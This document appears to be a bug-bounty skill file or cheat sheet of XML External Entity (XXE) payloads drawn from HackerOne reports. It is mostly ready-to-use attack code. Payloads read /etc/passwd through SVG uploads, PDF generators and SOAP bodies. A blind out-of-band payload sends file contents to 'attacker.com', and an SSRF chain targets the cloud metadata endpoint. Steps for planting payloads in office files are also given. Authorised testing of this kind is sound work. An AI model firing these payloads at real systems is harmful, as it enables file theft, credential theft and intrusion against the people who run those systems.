---
name: "h1-xxe-techniques"
description: "XML External Entity patterns from HackerOne reports — XXE in SVG upload, PDF generators, SOAP APIs, office file parsing, and blind XXE with OOB exfiltration"
category: web-security
tags: ["xxe", "xml-external-entity", "xml-injection", "oob-xxe", "blind-xxe", "hackerone"]
relevance: 9
---

# H1 XXE Testing Techniques

Real-world XXE vulnerabilities from HackerOne reports:

## 1. SVG Upload XXE
Test SVG file upload endpoints:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg>&xxe;</svg>
```

## 2. PDF/Report Generator XXE
Test HTML-to-PDF conversion endpoints:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

## 3. Blind XXE with OOB
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY % callhome SYSTEM "http://attacker.com/?data=%xxe;">
  %callhome;
]>
<foo>test</foo>
```

## 4. XXE via Office Documents
- DOCX/XLSX/PPTX files are ZIP archives containing XML
- Inject XXE payload into `document.xml` or `xl/sharedStrings.xml`
- Re-zip and upload

## 5. XXE via SOAP/XML-RPC APIs
```xml
<soap:Body>
  <foo>
    <![CDATA[<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>]>
    <bar>&xxe;</bar>
  </foo>
</soap:Body>
```

## XXE Blind Detection:
Use OOB (Out-of-Band) with collaborator:
- `<!ENTITY % test SYSTEM "http://collaborator.net/test">`
- Watch for DNS/HTTP callbacks

## XXE to SSRF chain:
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
```
